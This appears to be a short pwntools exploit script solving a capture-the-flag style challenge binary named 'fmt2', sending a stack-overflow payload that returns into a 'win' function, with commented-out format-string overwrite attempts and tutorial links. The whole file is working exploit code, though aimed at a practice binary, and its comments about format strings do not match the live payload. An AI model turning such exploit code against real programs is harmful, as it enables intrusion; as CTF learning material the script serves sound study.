#!/usr/bin/python2
from pwn import *

p = process('./fmt2')
binary = ELF('./fmt2',checksec=False)
exit_plt = 0x0000000000404040 
win  = 0x00000000004011d6
#bypass exit
#https://ret2rop.blogspot.com/2018/10/format-strings-got-overwrite-remote.html
#https://tripoloski1337.github.io/ctf/2020/06/11/format-string-bug.html
#format4 di protostar

payload = 'A' * 0x100
payload += 'B'* 8
payload += p64(0x000000000040101a)
payload += p64(binary.symbols['win'])
# payload += '%6$n'

# payload = fmtstr_payload(6, {AUTH : 10})

p.sendline(payload)
p.interactive()